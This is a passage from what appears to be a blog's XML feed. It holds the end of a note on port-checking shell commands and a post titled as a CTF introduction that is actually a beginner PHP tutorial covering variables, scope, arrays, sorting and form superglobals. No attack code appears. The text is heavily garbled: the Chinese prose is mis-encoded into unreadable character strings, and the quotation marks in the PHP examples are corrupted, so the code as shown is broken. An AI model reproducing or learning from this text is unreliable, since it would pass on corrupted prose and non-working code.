ç”¨äºæŸ¥çœ‹æŸä¸€ç«¯å£çš„å ç”¨æƒ…å†µï¼Œæ¯”å¦‚æŸ¥çœ‹8000ç«¯å£ä½¿ç”¨æƒ…å†µï¼Œlsof -i:8000</p><p>nginx -s quit<br>ps -ax | grep nginx<br>lsof -i:80<br>ip add</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFå…¥é—¨ WECALL 2</title>
      <link href="/2020/05/19/CTF%E5%85%A5%E9%97%A8%20WECALL1/"/>
      <url>/2020/05/19/CTF%E5%85%A5%E9%97%A8%20WECALL1/</url>
      
        <content type="html"><![CDATA[<h3 id="ä»€ä¹ˆæ˜¯PHPæ–‡ä»¶ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯PHPæ–‡ä»¶ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯PHPæ–‡ä»¶ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯PHPæ–‡ä»¶ï¼Ÿ</h3><p>PHPæ–‡ä»¶å¯ä»¥åŒ…å«æ–‡æœ¬ï¼ŒHTMLï¼ŒCSSï¼ŒJavaScriptå’ŒPHPä»£ç <br>PHPä»£ç åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œç»“æœä»¥çº¯HTMLæ ¼å¼è¿”å›åˆ°æµè§ˆå™¨<br>PHPæ–‡ä»¶çš„æ‰©å±•åä¸ºâ€œ .phpâ€</p><a id="more"></a><h3 id="PHPå¯ä»¥åšä»€ä¹ˆï¼Ÿ"><a href="#PHPå¯ä»¥åšä»€ä¹ˆï¼Ÿ" class="headerlink" title="PHPå¯ä»¥åšä»€ä¹ˆï¼Ÿ"></a>PHPå¯ä»¥åšä»€ä¹ˆï¼Ÿ</h3><p>PHPå¯ä»¥ç”ŸæˆåŠ¨æ€é¡µé¢å†…å®¹<br>PHPå¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºï¼Œæ‰“å¼€ï¼Œè¯»å–ï¼Œå†™å…¥ï¼Œåˆ é™¤å’Œå…³é—­æ–‡ä»¶<br>PHPå¯ä»¥æ”¶é›†è¡¨å•æ•°æ®<br>PHPå¯ä»¥å‘é€å’Œæ¥æ”¶Cookie<br>PHPå¯ä»¥æ·»åŠ ï¼Œåˆ é™¤ï¼Œä¿®æ”¹æ•°æ®åº“ä¸­çš„æ•°æ®<br>PHPå¯ç”¨äºæ§åˆ¶ç”¨æˆ·è®¿é—®<br>PHPå¯ä»¥åŠ å¯†æ•°æ®<br>ä½¿ç”¨PHPï¼Œæ‚¨ä¸ä»…å¯ä»¥è¾“å‡ºHTMLã€‚æ‚¨å¯ä»¥è¾“å‡ºå›¾åƒï¼ŒPDFæ–‡ä»¶ç”šè‡³Flashç”µå½±ã€‚æ‚¨è¿˜å¯ä»¥è¾“å‡ºä»»ä½•æ–‡æœ¬ï¼Œä¾‹å¦‚XHTMLå’ŒXMLã€‚</p><p>PHPè„šæœ¬å¯ä»¥æ”¾åœ¨æ–‡æ¡£ä¸­çš„ä»»ä½•ä½ç½®ã€‚<br>PHPè„šæœ¬çš„å¼€å¤´<code>&lt;?php</code>å’Œç»“å°¾æ˜¯<code>?&gt;</code>ï¼š<br>&lt;?php<br>// PHP code goes here<br>?&gt;<br>PHPæ–‡ä»¶çš„é»˜è®¤æ–‡ä»¶æ‰©å±•åæ˜¯â€œ .phpâ€ã€‚<br>ä¸€ä¸ªPHPæ–‡ä»¶é€šå¸¸åŒ…å«HTMLæ ‡è®°å’Œä¸€äº›PHPè„šæœ¬ä»£ç ã€‚</p><p> PHPè¯­å¥ä»¥åˆ†å·ï¼ˆ<code>;</code>ï¼‰ç»“å°¾ã€‚</p><p>åœ¨PHPä¸­ï¼Œå…³é”®å­—ï¼ˆä¾‹å¦‚ifï¼Œ elseï¼Œwhileï¼Œ echoç­‰ï¼‰ï¼Œç±»ï¼Œå‡½æ•°ï¼Œå’Œç”¨æˆ·å®šä¹‰çš„å‡½æ•°<code>æ˜¯ä¸åŒºåˆ†å¤§å°å†™ã€‚</code></p><p>æ‰€æœ‰<code>å˜é‡åç§°å‡åŒºåˆ†å¤§å°å†™</code>ï¼</p><p>comment<br>//<br>#<br>/<em>        </em>/</p><p>åœ¨PHPä¸­ï¼Œå˜é‡ä»¥$ç¬¦å·å¼€å¤´ï¼Œåè·Ÿå˜é‡åç§°</p><p>ä¸å…¶ä»–ç¼–ç¨‹è¯­è¨€ä¸åŒï¼ŒPHPæ²¡æœ‰ç”¨äºå£°æ˜å˜é‡çš„å‘½ä»¤ã€‚å®ƒæ˜¯åœ¨æ‚¨é¦–æ¬¡ä¸ºå…¶åˆ†é…å€¼æ—¶åˆ›å»ºçš„ã€‚</p><p>&lt;?php<br>$txt = â€œW3Schools.comâ€;<br>echo â€œI love $txt!â€;<br>?&gt;</p><p>&lt;?php<br>$txt = â€œW3Schools.comâ€;<br>echo â€œI love â€œ . $txt . â€œ!â€;<br>?&gt;</p><p>&lt;?php<br>$x = 5;<br>$y = 4;<br>echo $x + $y;<br>?&gt;</p><h5 id="åœ¨å‡½æ•°å¤–éƒ¨å£°æ˜çš„å˜é‡å…·æœ‰å…¨å±€èŒƒå›´ï¼Œå¹¶ä¸”åªèƒ½åœ¨å‡½æ•°å¤–éƒ¨è®¿é—®"><a href="#åœ¨å‡½æ•°å¤–éƒ¨å£°æ˜çš„å˜é‡å…·æœ‰å…¨å±€èŒƒå›´ï¼Œå¹¶ä¸”åªèƒ½åœ¨å‡½æ•°å¤–éƒ¨è®¿é—®" class="headerlink" title="åœ¨å‡½æ•°å¤–éƒ¨å£°æ˜çš„å˜é‡å…·æœ‰å…¨å±€èŒƒå›´ï¼Œå¹¶ä¸”åªèƒ½åœ¨å‡½æ•°å¤–éƒ¨è®¿é—®"></a>åœ¨å‡½æ•°å¤–éƒ¨å£°æ˜çš„å˜é‡å…·æœ‰å…¨å±€èŒƒå›´ï¼Œå¹¶ä¸”åªèƒ½åœ¨å‡½æ•°å¤–éƒ¨è®¿é—®</h5><h5 id="åœ¨å‡½æ•°å†…å£°æ˜çš„å˜é‡å…·æœ‰å±€éƒ¨èŒƒå›´ï¼Œåªèƒ½åœ¨è¯¥å‡½æ•°å†…è®¿é—®"><a href="#åœ¨å‡½æ•°å†…å£°æ˜çš„å˜é‡å…·æœ‰å±€éƒ¨èŒƒå›´ï¼Œåªèƒ½åœ¨è¯¥å‡½æ•°å†…è®¿é—®" class="headerlink" title="åœ¨å‡½æ•°å†…å£°æ˜çš„å˜é‡å…·æœ‰å±€éƒ¨èŒƒå›´ï¼Œåªèƒ½åœ¨è¯¥å‡½æ•°å†…è®¿é—®"></a>åœ¨å‡½æ•°å†…å£°æ˜çš„å˜é‡å…·æœ‰å±€éƒ¨èŒƒå›´ï¼Œåªèƒ½åœ¨è¯¥å‡½æ•°å†…è®¿é—®</h5><h5 id="globalå…³é”®å­—ç”¨äºåœ¨å‡½æ•°å†…éƒ¨è®¿é—®ä¸€ä¸ªå…¨å±€å˜é‡ã€‚"><a href="#globalå…³é”®å­—ç”¨äºåœ¨å‡½æ•°å†…éƒ¨è®¿é—®ä¸€ä¸ªå…¨å±€å˜é‡ã€‚" class="headerlink" title="globalå…³é”®å­—ç”¨äºåœ¨å‡½æ•°å†…éƒ¨è®¿é—®ä¸€ä¸ªå…¨å±€å˜é‡ã€‚"></a>globalå…³é”®å­—ç”¨äºåœ¨å‡½æ•°å†…éƒ¨è®¿é—®ä¸€ä¸ªå…¨å±€å˜é‡ã€‚</h5><p>ä¸ºæ­¤ï¼Œè¯·globalåœ¨å˜é‡ä¹‹å‰ï¼ˆåœ¨å‡½æ•°å†…éƒ¨ï¼‰ä½¿ç”¨å…³é”®å­—<br>&lt;?php<br>$x = 5;<br>$y = 10;<br>function myTest() {<br>  global $x, $y;<br>  $y = $x + $y;<br>}<br>myTest();<br>echo $y; // outputs 15<br>?&gt;</p><p>PHP also stores all global variables in an array called $GLOBALS[index]. The index holds the name of the variable. This array is also accessible from within functions and can be used to update global variables directly.</p><p>&lt;?php<br>$x = 5;<br>$y = 10;<br>function myTest() {<br>  $GLOBALS[â€˜yâ€™] = $GLOBALS[â€˜xâ€™] + $GLOBALS[â€˜yâ€™];<br>}<br>myTest();<br>echo $y; // outputs 15<br>?&gt;</p><p>é€šå¸¸ï¼Œå½“ä¸€ä¸ªå‡½æ•°å®Œæˆ/æ‰§è¡Œæ—¶ï¼Œå®ƒçš„æ‰€æœ‰å˜é‡éƒ½ä¼šè¢«åˆ é™¤ã€‚ä½†æ˜¯ï¼Œæœ‰æ—¶æˆ‘ä»¬å¸Œæœ›ä¸åˆ é™¤å±€éƒ¨å˜é‡ã€‚æˆ‘ä»¬éœ€è¦å®ƒæ¥åšè¿›ä¸€æ­¥çš„å·¥ä½œã€‚<br>ä¸ºæ­¤ï¼Œè¯·staticåœ¨é¦–æ¬¡å£°æ˜å˜é‡æ—¶ä½¿ç”¨å…³é”®å­—<br>ç„¶åï¼Œæ¯æ¬¡è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œè¯¥å˜é‡ä»å°†å…·æœ‰è‡ªä¸Šæ¬¡è°ƒç”¨è¯¥å‡½æ•°ä»¥æ¥æ‰€åŒ…å«çš„ä¿¡æ¯ã€‚<br>æ³¨æ„ï¼šè¯¥å˜é‡ä»ç„¶æ˜¯å‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚</p><p>å·®å¼‚å¾ˆå°ï¼šechoæ²¡æœ‰è¿”å›å€¼ï¼Œè€Œprintè¿”å›å€¼ä¸º1ï¼Œå› æ­¤å¯ä»¥åœ¨è¡¨è¾¾å¼ä¸­ä½¿ç”¨ã€‚echoå¯ä»¥é‡‡ç”¨å¤šä¸ªå‚æ•°ï¼ˆå°½ç®¡è¿™ç§ç”¨æ³•å¾ˆå°‘è§ï¼‰ï¼Œè€Œprintå¯ä»¥é‡‡ç”¨ä¸€ä¸ªå‚æ•°ã€‚echoæ¯”å¿«ä¸€ç‚¹printã€‚</p><p>&lt;?php<br>echo â€œ</p><h2>PHP is Fun!</h2>â€œ;<br>echo â€œHello world!<br>â€œ;<br>echo â€œIâ€™m about to learn PHP!<br>â€œ;<br>echo â€œThis â€œ, â€œstring â€œ, â€œwas â€œ, â€œmade â€œ, â€œwith multiple parameters.â€;<br>?&gt;<p></p><h5 id="å­—ç¬¦ä¸²å¯ä»¥æ˜¯å¼•å·å†…çš„ä»»ä½•æ–‡æœ¬ã€‚å¯ä»¥ä½¿ç”¨å•å¼•å·æˆ–åŒå¼•å·"><a href="#å­—ç¬¦ä¸²å¯ä»¥æ˜¯å¼•å·å†…çš„ä»»ä½•æ–‡æœ¬ã€‚å¯ä»¥ä½¿ç”¨å•å¼•å·æˆ–åŒå¼•å·" class="headerlink" title="å­—ç¬¦ä¸²å¯ä»¥æ˜¯å¼•å·å†…çš„ä»»ä½•æ–‡æœ¬ã€‚å¯ä»¥ä½¿ç”¨å•å¼•å·æˆ–åŒå¼•å·"></a>å­—ç¬¦ä¸²å¯ä»¥æ˜¯å¼•å·å†…çš„ä»»ä½•æ–‡æœ¬ã€‚å¯ä»¥ä½¿ç”¨å•å¼•å·æˆ–åŒå¼•å·</h5><p>æ•´æ•°æ•°æ®ç±»å‹æ˜¯-2,147,483,648å’Œ2,147,483,647ä¹‹é—´çš„éåè¿›åˆ¶æ•°ã€‚<br>PHP var_dumpï¼ˆï¼‰å‡½æ•°è¿”å›æ•°æ®ç±»å‹å’Œå€¼</p><p>&lt;?php<br>$cars = array(â€œVolvoâ€,â€BMWâ€,â€Toyotaâ€);<br>var_dump($cars);<br>?&gt;</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¿…é¡»å£°æ˜ä¸€ä¸ªå¯¹è±¡ç±»ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬ä½¿ç”¨classå…³é”®å­—ã€‚ç±»æ˜¯å¯ä»¥åŒ…å«å±æ€§å’Œæ–¹æ³•çš„ç»“æ„ï¼š<br>&lt;?php<br>class Car {<br>  function Car() {<br>    $this-&gt;model = â€œVWâ€;<br>  }<br>}<br>// create an object<br>$herbie = new Car();<br>// show object properties<br>echo $herbie-&gt;model;<br>?&gt;</p><p>å¦‚æœåˆ›å»ºçš„å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šè‡ªåŠ¨ä¸ºå…¶åˆ†é…å€¼NULLã€‚<br>ä¹Ÿå¯ä»¥é€šè¿‡å°†å€¼è®¾ç½®ä¸ºNULLæ¥æ¸…ç©ºå˜é‡ï¼š</p><p>å…³äºPHPçš„æ³¨æ„äº‹é¡¹ä¹‹ä¸€æ˜¯å®ƒæä¾›äº†è‡ªåŠ¨æ•°æ®ç±»å‹è½¬æ¢ã€‚<br>å› æ­¤ï¼Œå¦‚æœå°†æ•´æ•°å€¼åˆ†é…ç»™å˜é‡ï¼Œåˆ™è¯¥å˜é‡çš„ç±»å‹å°†è‡ªåŠ¨ä¸ºæ•´æ•°ã€‚ç„¶åï¼Œå¦‚æœå°†å­—ç¬¦ä¸²åˆ†é…ç»™ç›¸åŒçš„å˜é‡ï¼Œåˆ™ç±»å‹å°†æ›´æ”¹ä¸ºå­—ç¬¦ä¸²ã€‚</p><p>æ•´æ•°å¯ä»¥ä»¥ä¸‰ç§æ ¼å¼æŒ‡å®šï¼šåè¿›åˆ¶ï¼ˆåŸºäº10çš„ï¼‰ï¼Œåå…­è¿›åˆ¶ï¼ˆåŸºäº16çš„-å¸¦æœ‰0xå‰ç¼€ï¼‰æˆ–å…«è¿›åˆ¶ï¼ˆåŸºäº8çš„-å¸¦æœ‰0å‰ç¼€ï¼‰</p><p>ï¼ˆintï¼‰ï¼Œï¼ˆintegerï¼‰æˆ–intvalï¼ˆï¼‰å‡½æ•°é€šå¸¸ç”¨äºå°†å€¼è½¬æ¢ä¸ºæ•´æ•°ã€‚</p><p>æœ‰æ•ˆçš„å¸¸é‡åç§°ä»¥å­—æ¯æˆ–ä¸‹åˆ’çº¿å¼€å¤´ï¼ˆå¸¸é‡åç§°å‰æ²¡æœ‰$ç¬¦å·ï¼‰ã€‚</p><p>æ³¨æ„ï¼šä¸å˜é‡ä¸åŒï¼Œå¸¸é‡åœ¨æ•´ä¸ªè„šæœ¬ä¸­è‡ªåŠ¨ä¸ºå…¨å±€å˜é‡ã€‚<br>define(name, value, case-insensitive)<br>åœ¨PHP7ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨define()å‡½æ•°åˆ›å»ºä¸€ä¸ªArrayå¸¸é‡ã€‚</p><p>.    Concatenation    $txt1 . $txt2    Concatenation of $txt1 and $txt2<br>.=    Concatenation assignment    $txt1 .= $txt2    Appends $txt2 to $txt1</p><p>&lt;?php<br>$t = date(â€œHâ€);</p><p>if ($t &lt; â€œ20â€) {<br>  echo â€œHave a good day!â€;<br>}<br>?&gt;</p><h4 id="è¯¥foreachå¾ªç¯ä»…é€‚ç”¨äºæ•°ç»„ï¼Œç”¨äºå¾ªç¯éå†æ•°ç»„ä¸­çš„æ¯ä¸ªé”®-å€¼å¯¹ã€‚"><a href="#è¯¥foreachå¾ªç¯ä»…é€‚ç”¨äºæ•°ç»„ï¼Œç”¨äºå¾ªç¯éå†æ•°ç»„ä¸­çš„æ¯ä¸ªé”®-å€¼å¯¹ã€‚" class="headerlink" title="è¯¥foreachå¾ªç¯ä»…é€‚ç”¨äºæ•°ç»„ï¼Œç”¨äºå¾ªç¯éå†æ•°ç»„ä¸­çš„æ¯ä¸ªé”®/å€¼å¯¹ã€‚"></a>è¯¥foreachå¾ªç¯ä»…é€‚ç”¨äºæ•°ç»„ï¼Œç”¨äºå¾ªç¯éå†æ•°ç»„ä¸­çš„æ¯ä¸ªé”®/å€¼å¯¹ã€‚</h4><p>å¥æ³•<br>foreach ($array as $value) {<br>  code to be executed;<br>}<br>å¯¹äºæ¯æ¬¡å¾ªç¯è¿­ä»£ï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„å€¼éƒ½åˆ†é…ç»™$ valueï¼Œå¹¶ä¸”æ•°ç»„æŒ‡é’ˆç§»åŠ¨ä¸€ä¸ªï¼Œç›´åˆ°åˆ°è¾¾æœ€åä¸€ä¸ªæ•°ç»„å…ƒç´ ã€‚</p><p>è¦æŒ‡å®šï¼Œstrictæˆ‘ä»¬éœ€è¦è®¾ç½®declare(strict_types=1);ã€‚è¿™å¿…é¡»åœ¨PHPæ–‡ä»¶çš„ç¬¬ä¸€è¡Œã€‚<br>è¿™ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªåœ¨å£°æ˜å‡½æ•°æ—¶æŒ‡å®šæ‰€éœ€æ•°æ®ç±»å‹çš„é€‰é¡¹ï¼Œå¹¶ä¸”é€šè¿‡æ·»åŠ strict å£°æ˜ï¼Œå¦‚æœæ•°æ®ç±»å‹ä¸åŒ¹é…ï¼Œå®ƒå°†æŠ›å‡ºâ€œè‡´å‘½é”™è¯¯â€ã€‚</p><p>&lt;?php declare(strict_types=1); // strict requirement<br>function addNumbers(float $a, float $b) : float {<br>  return $a + $b;<br>}<br>echo addNumbers(1.2, 5.2);<br>?&gt;</p><p>&lt;?php declare(strict_types=1); // strict requirement<br>function addNumbers(float $a, float $b) : int {<br>  return (int)($a + $b);<br>}<br>echo addNumbers(1.2, 5.2);<br>?&gt;</p><p>&lt;?php<br>$cars = array(â€œVolvoâ€, â€œBMWâ€, â€œToyotaâ€);<br>echo â€œI like â€œ . $cars[0] . â€œ, â€œ . $cars[1] . â€œ and â€œ . $cars[2] . â€œ.â€;<br>?&gt;</p><p>å…³è”æ•°ç»„æ˜¯ä½¿ç”¨åˆ†é…ç»™å®ƒä»¬çš„å‘½åé”®çš„æ•°ç»„ã€‚<br>æœ‰ä¸¤ç§åˆ›å»ºå…³è”æ•°ç»„çš„æ–¹æ³•ï¼š<br>$age = array(â€œPeterâ€=&gt;â€35â€, â€œBenâ€=&gt;â€37â€, â€œJoeâ€=&gt;â€43â€);<br>è¦ä¹ˆï¼š<br>$age[â€˜Peterâ€™] = â€œ35â€;<br>$age[â€˜Benâ€™] = â€œ37â€;<br>$age[â€˜Joeâ€™] = â€œ43â€;<br>ç„¶åå¯ä»¥åœ¨è„šæœ¬ä¸­ä½¿ç”¨å‘½åçš„é”®ï¼š</p><p>$cars = array (<br>  array(â€œVolvoâ€,22,18),<br>  array(â€œBMWâ€,15,13),<br>  array(â€œSaabâ€,5,2),<br>  array(â€œLand Roverâ€,17,15)<br>);<br>&lt;?php<br>echo $cars[0][0].â€: In stock: â€œ.$cars[0][1].â€, sold: â€œ.$cars[0][2].â€.<br>â€œ;<br>echo $cars[1][0].â€: In stock: â€œ.$cars[1][1].â€, sold: â€œ.$cars[1][2].â€.<br>â€œ;<br>echo $cars[2][0].â€: In stock: â€œ.$cars[2][1].â€, sold: â€œ.$cars[2][2].â€.<br>â€œ;<br>echo $cars[3][0].â€: In stock: â€œ.$cars[3][1].â€, sold: â€œ.$cars[3][2].â€.<br>â€œ;<br>?&gt;</p><p>sort() -ä»¥å‡åºæ’åˆ—æ•°ç»„<br>rsort() -ä»¥é™åºæ’åˆ—æ•°ç»„<br>asort() -æ ¹æ®å€¼ä»¥å‡åºå¯¹å…³è”æ•°ç»„è¿›è¡Œæ’åº<br>ksort() -æ ¹æ®é”®ä»¥å‡åºå¯¹å…³è”æ•°ç»„è¿›è¡Œæ’åº<br>arsort() -æ ¹æ®å€¼ä»¥é™åºå¯¹å…³è”æ•°ç»„è¿›è¡Œæ’åº<br>krsort() -æ ¹æ®é”®ä»¥é™åºå¯¹å…³è”æ•°ç»„è¿›è¡Œæ’åº</p><h4 id="ç”¨äºåœ¨ä½¿ç”¨method-â€œ-postâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚-POSTä¹Ÿå¹¿æ³›ç”¨äºä¼ é€’å˜é‡ã€‚"><a href="#ç”¨äºåœ¨ä½¿ç”¨method-â€œ-postâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚-POSTä¹Ÿå¹¿æ³›ç”¨äºä¼ é€’å˜é‡ã€‚" class="headerlink" title="ç”¨äºåœ¨ä½¿ç”¨method =â€œ postâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚$ _POSTä¹Ÿå¹¿æ³›ç”¨äºä¼ é€’å˜é‡ã€‚"></a>ç”¨äºåœ¨ä½¿ç”¨method =â€œ postâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚$ _POSTä¹Ÿå¹¿æ³›ç”¨äºä¼ é€’å˜é‡ã€‚</h4><h5 id="SERVER-â€˜PHP-SELFâ€™-Returns-the-filename-of-the-currently-executing-script"><a href="#SERVER-â€˜PHP-SELFâ€™-Returns-the-filename-of-the-currently-executing-script" class="headerlink" title="$_SERVER[â€˜PHP_SELFâ€™]    Returns the filename of the currently executing script"></a>$_SERVER[â€˜PHP_SELFâ€™]    Returns the filename of the currently executing script</h5><h5 id="SERVER-â€˜REQUEST-METHODâ€™-Returns-the-request-method-used-to-access-the-page-such-as-POST"><a href="#SERVER-â€˜REQUEST-METHODâ€™-Returns-the-request-method-used-to-access-the-page-such-as-POST" class="headerlink" title="$_SERVER[â€˜REQUEST_METHODâ€™]    Returns the request method used to access the page (such as POST)"></a>$_SERVER[â€˜REQUEST_METHODâ€™]    Returns the request method used to access the page (such as POST)</h5><h4 id="PHP-GETæ˜¯ä¸€ä¸ªPHPè¶…çº§å…¨å±€å˜é‡ï¼Œç”¨äºåœ¨ä½¿ç”¨method-â€œ-getâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚"><a href="#PHP-GETæ˜¯ä¸€ä¸ªPHPè¶…çº§å…¨å±€å˜é‡ï¼Œç”¨äºåœ¨ä½¿ç”¨method-â€œ-getâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚" class="headerlink" title="PHP $ _GETæ˜¯ä¸€ä¸ªPHPè¶…çº§å…¨å±€å˜é‡ï¼Œç”¨äºåœ¨ä½¿ç”¨method =â€œ getâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚"></a>PHP $ _GETæ˜¯ä¸€ä¸ªPHPè¶…çº§å…¨å±€å˜é‡ï¼Œç”¨äºåœ¨ä½¿ç”¨method =â€œ getâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚</h4><h5 id="GETè¿˜å¯ä»¥æ”¶é›†åœ¨URLä¸­å‘é€çš„æ•°æ®ã€‚"><a href="#GETè¿˜å¯ä»¥æ”¶é›†åœ¨URLä¸­å‘é€çš„æ•°æ®ã€‚" class="headerlink" title="$ _GETè¿˜å¯ä»¥æ”¶é›†åœ¨URLä¸­å‘é€çš„æ•°æ®ã€‚"></a>$ _GETè¿˜å¯ä»¥æ”¶é›†åœ¨URLä¸­å‘é€çš„æ•°æ®ã€‚</h5><h4 id="ä½¿ç”¨GETæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹æ‰€æœ‰äººéƒ½æ˜¯å¯è§çš„ï¼ˆæ‰€æœ‰å˜é‡åå’Œå€¼éƒ½æ˜¾ç¤ºåœ¨URLä¸­ï¼‰ã€‚GETå¯¹å‘é€çš„ä¿¡æ¯é‡ä¹Ÿæœ‰é™åˆ¶ã€‚é™åˆ¶çº¦ä¸º2000ä¸ªå­—ç¬¦ã€‚ä½†æ˜¯ï¼Œç”±äºå˜é‡æ˜¾ç¤ºåœ¨URLä¸­ï¼Œå› æ­¤å¯ä»¥ä¸ºé¡µé¢æ·»åŠ ä¹¦ç­¾ã€‚åœ¨æŸäº›æƒ…å†µä¸‹è¿™å¯èƒ½å¾ˆæœ‰ç”¨ã€‚"><a href="#ä½¿ç”¨GETæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹æ‰€æœ‰äººéƒ½æ˜¯å¯è§çš„ï¼ˆæ‰€æœ‰å˜é‡åå’Œå€¼éƒ½æ˜¾ç¤ºåœ¨URLä¸­ï¼‰ã€‚GETå¯¹å‘é€çš„ä¿¡æ¯é‡ä¹Ÿæœ‰é™åˆ¶ã€‚é™åˆ¶çº¦ä¸º2000ä¸ªå­—ç¬¦ã€‚ä½†æ˜¯ï¼Œç”±äºå˜é‡æ˜¾ç¤ºåœ¨URLä¸­ï¼Œå› æ­¤å¯ä»¥ä¸ºé¡µé¢æ·»åŠ ä¹¦ç­¾ã€‚åœ¨æŸäº›æƒ…å†µä¸‹è¿™å¯èƒ½å¾ˆæœ‰ç”¨ã€‚" class="headerlink" title="ä½¿ç”¨GETæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹æ‰€æœ‰äººéƒ½æ˜¯å¯è§çš„ï¼ˆæ‰€æœ‰å˜é‡åå’Œå€¼éƒ½æ˜¾ç¤ºåœ¨URLä¸­ï¼‰ã€‚GETå¯¹å‘é€çš„ä¿¡æ¯é‡ä¹Ÿæœ‰é™åˆ¶ã€‚é™åˆ¶çº¦ä¸º2000ä¸ªå­—ç¬¦ã€‚ä½†æ˜¯ï¼Œç”±äºå˜é‡æ˜¾ç¤ºåœ¨URLä¸­ï¼Œå› æ­¤å¯ä»¥ä¸ºé¡µé¢æ·»åŠ ä¹¦ç­¾ã€‚åœ¨æŸäº›æƒ…å†µä¸‹è¿™å¯èƒ½å¾ˆæœ‰ç”¨ã€‚"></a>ä½¿ç”¨GETæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹æ‰€æœ‰äººéƒ½æ˜¯å¯è§çš„ï¼ˆæ‰€æœ‰å˜é‡åå’Œå€¼éƒ½æ˜¾ç¤ºåœ¨URLä¸­ï¼‰ã€‚GETå¯¹å‘é€çš„ä¿¡æ¯é‡ä¹Ÿæœ‰é™åˆ¶ã€‚é™åˆ¶çº¦ä¸º2000ä¸ªå­—ç¬¦ã€‚ä½†æ˜¯ï¼Œç”±äºå˜é‡æ˜¾ç¤ºåœ¨URLä¸­ï¼Œå› æ­¤å¯ä»¥ä¸ºé¡µé¢æ·»åŠ ä¹¦ç­¾ã€‚åœ¨æŸäº›æƒ…å†µä¸‹è¿™å¯èƒ½å¾ˆæœ‰ç”¨ã€‚</h4><p>GETå¯ä»¥ç”¨äºå‘é€éæ•æ„Ÿæ•°æ®ã€‚<br>æ³¨æ„ï¼šç»å¯¹ä¸è¦å°†GETç”¨äºå‘é€å¯†ç æˆ–å…¶ä»–æ•æ„Ÿä¿¡æ¯ï¼</p><h5 id="ä½¿ç”¨POSTæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹äºå…¶ä»–äººæ˜¯ä¸å¯è§çš„-ï¼ˆæ‰€æœ‰åç§°-å€¼éƒ½åµŒå…¥åœ¨HTTPè¯·æ±‚çš„æ­£æ–‡ä¸­ï¼‰ï¼Œå¹¶ä¸”å¯¹è¦å‘é€çš„ä¿¡æ¯é‡æ²¡æœ‰é™åˆ¶ã€‚"><a href="#ä½¿ç”¨POSTæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹äºå…¶ä»–äººæ˜¯ä¸å¯è§çš„-ï¼ˆæ‰€æœ‰åç§°-å€¼éƒ½åµŒå…¥åœ¨HTTPè¯·æ±‚çš„æ­£æ–‡ä¸­ï¼‰ï¼Œå¹¶ä¸”å¯¹è¦å‘é€çš„ä¿¡æ¯é‡æ²¡æœ‰é™åˆ¶ã€‚" class="headerlink" title="ä½¿ç”¨POSTæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹äºå…¶ä»–äººæ˜¯ä¸å¯è§çš„ ï¼ˆæ‰€æœ‰åç§°/å€¼éƒ½åµŒå…¥åœ¨HTTPè¯·æ±‚çš„æ­£æ–‡ä¸­ï¼‰ï¼Œå¹¶ä¸”å¯¹è¦å‘é€çš„ä¿¡æ¯é‡æ²¡æœ‰é™åˆ¶ã€‚"></a>ä½¿ç”¨POSTæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹äºå…¶ä»–äººæ˜¯ä¸å¯è§çš„ ï¼ˆæ‰€æœ‰åç§°/å€¼éƒ½åµŒå…¥åœ¨HTTPè¯·æ±‚çš„æ­£æ–‡ä¸­ï¼‰ï¼Œå¹¶ä¸”å¯¹è¦å‘é€çš„ä¿¡æ¯é‡æ²¡æœ‰é™åˆ¶ã€‚</h5><p>æ­¤å¤–ï¼ŒPOSTæ”¯æŒé«˜çº§åŠŸèƒ½ï¼Œä¾‹å¦‚åœ¨å°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨æ—¶æ”¯æŒå¤šéƒ¨åˆ†äºŒè¿›åˆ¶è¾“å…¥ã€‚<br>ä½†æ˜¯ï¼Œç”±äºå˜é‡æœªæ˜¾ç¤ºåœ¨URLä¸­ï¼Œå› æ­¤æ— æ³•ä¸ºé¡µé¢æ·»åŠ ä¹¦ç­¾ã€‚</p><h5 id="SERVER-â€œ-PHP-SELFâ€-å°†æäº¤çš„è¡¨å•æ•°æ®å‘é€åˆ°é¡µé¢æœ¬èº«ï¼Œè€Œä¸æ˜¯è·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ã€‚è¿™æ ·ï¼Œç”¨æˆ·å°†åœ¨ä¸è¡¨å•ç›¸åŒçš„é¡µé¢ä¸Šæ”¶åˆ°é”™è¯¯æ¶ˆæ¯ã€‚"><a 